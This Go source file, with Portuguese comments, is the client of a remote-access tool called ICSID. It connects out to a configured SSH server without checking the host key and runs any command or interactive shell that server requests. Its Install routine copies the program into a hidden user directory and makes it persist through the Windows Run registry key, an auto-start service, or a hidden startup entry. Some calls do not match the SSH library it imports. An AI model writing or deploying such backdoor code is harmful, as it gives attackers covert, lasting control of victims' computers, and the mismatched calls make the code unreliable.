package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"github.com/gliderlabs/ssh"
	"github.com/icsid/icsid/internal/config"
)

type Client struct {
	config *config.Config
	conn   net.Conn
}

func New(cfg *config.Config) *Client {
	return &Client{
		config: cfg,
	}
}

func (c *Client) Connect() error {
	// Conecta ao servidor SSH
	conn, err := net.Dial("tcp", c.config.Client.ServerAddress)
	if err != nil {
		return fmt.Errorf("erro ao conectar ao servidor: %v", err)
	}

	c.conn = conn

	// Configura a conexão SSH
	_, chans, reqs, err := ssh.NewClientConn(conn, c.config.Client.ServerAddress, &ssh.ClientConfig{
		User: c.config.Client.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.config.Client.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return fmt.Errorf("erro ao estabelecer conexão SSH: %v", err)
	}

	// Processa os canais SSH
	go ssh.DiscardRequests(reqs)
	go c.handleChannels(chans)

	return nil
}

func (c *Client) handleChannels(chans <-chan ssh.NewChannel) {
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "tipo de canal desconhecido")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("erro ao aceitar canal: %v", err)
			continue
		}

		go c.handleChannel(channel, requests)
	}
}

func (c *Client) handleChannel(channel ssh.Channel, requests <-chan *ssh.Request) {
	// Processa requisições do canal
	go func(in <-chan *ssh.Request) {
		for req := range in {
			switch req.Type {
			case "exec":
				go c.handleExec(channel, req)
			case "pty-req":
				req.Reply(true, nil)
			case "shell":
				go c.handleShell(channel)
			default:
				req.Reply(false, nil)
			}
		}
	}(requests)
}

func (c *Client) handleExec(channel ssh.Channel, req *ssh.Request) {
	var execReq struct {
		Command string
	}

	if err := ssh.Unmarshal(req.Payload, &execReq); err != nil {
		req.Reply(false, nil)
		return
	}

	cmd := exec.Command("sh", "-c", execReq.Command)
	cmd.Stdout = channel
	cmd.Stderr = channel.Stderr()
	cmd.Stdin = channel

	if err := cmd.Run(); err != nil {
		log.Printf("erro ao executar comando: %v", err)
	}

	channel.Close()
}

func (c *Client) handleShell(channel ssh.Channel) {
	defer channel.Close()

	// Configura o terminal
	term := os.Getenv("TERM")
	if term == "" {
		term = "xterm-256color"
	}

	// Configura o shell
	shell := os.Getenv("SHELL")
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = "cmd.exe"
		} else {
			shell = "/bin/sh"
		}
	}

	// Executa o shell
	cmd := exec.Command(shell)
	cmd.Env = append(os.Environ(), "TERM="+term)
	cmd.Stdout = channel
	cmd.Stderr = channel.Stderr()
	cmd.Stdin = channel

	if err := cmd.Start(); err != nil {
		log.Printf("erro ao iniciar shell: %v", err)
		return
	}

	// Aguarda o shell terminar
	cmd.Wait()
}

func (c *Client) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

func (c *Client) Install() error {
	// Determina o caminho de instalação
	installPath := filepath.Join(os.Getenv("APPDATA"), "ICSID")
	if runtime.GOOS != "windows" {
		installPath = filepath.Join(os.Getenv("HOME"), ".icsid")
	}

	// Cria o diretório de instalação
	if err := os.MkdirAll(installPath, 0700); err != nil {
		return fmt.Errorf("erro ao criar diretório de instalação: %v", err)
	}

	// Copia o executável
	execPath := filepath.Join(installPath, "icsid.exe")
	if runtime.GOOS != "windows" {
		execPath = filepath.Join(installPath, "icsid")
	}

	// Obtém o caminho do executável atual
	currentExec, err := os.Executable()
	if err != nil {
		return fmt.Errorf("erro ao obter caminho do executável: %v", err)
	}

	// Copia o arquivo
	src, err := os.Open(currentExec)
	if err != nil {
		return fmt.Errorf("erro ao abrir executável atual: %v", err)
	}
	defer src.Close()

	dst, err := os.Create(execPath)
	if err != nil {
		return fmt.Errorf("erro ao criar executável de destino: %v", err)
	}
	defer dst.Close()

	if _, err := io.Copy(dst, src); err != nil {
		return fmt.Errorf("erro ao copiar executável: %v", err)
	}

	// Configura a persistência
	if c.config.Persistence.Enabled {
		switch c.config.Persistence.Method {
		case "registry":
			if runtime.GOOS == "windows" {
				// Adiciona à chave de registro
				cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "ICSID", "/t", "REG_SZ", "/d", execPath, "/f")
				if err := cmd.Run(); err != nil {
					return fmt.Errorf("erro ao adicionar ao registro: %v", err)
				}
			}
		case "service":
			if runtime.GOOS == "windows" {
				// Cria um serviço do Windows
				cmd := exec.Command("sc", "create", "ICSID", "binPath=", execPath, "start=", "auto")
				if err := cmd.Run(); err != nil {
					return fmt.Errorf("erro ao criar serviço: %v", err)
				}
			}
		case "startup":
			// Adiciona ao diretório de inicialização
			startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
			if runtime.GOOS != "windows" {
				startupPath = filepath.Join(os.Getenv("HOME"), ".config/autostart")
			}

			linkPath := filepath.Join(startupPath, "icsid.lnk")
			if runtime.GOOS == "windows" {
				// Cria um atalho
				cmd := exec.Command("powershell", "-Command", fmt.Sprintf("$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()", linkPath, execPath))
				if err := cmd.Run(); err != nil {
					return fmt.Errorf("erro ao criar atalho: %v", err)
				}
			} else {
				// Cria um arquivo .desktop
				desktopEntry := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=ICSID\nExec=%s\nHidden=true\n", execPath)
				if err := os.WriteFile(linkPath, []byte(desktopEntry), 0644); err != nil {
					return fmt.Errorf("erro ao criar arquivo .desktop: %v", err)
				}
			}
		}
	}

	return nil
}
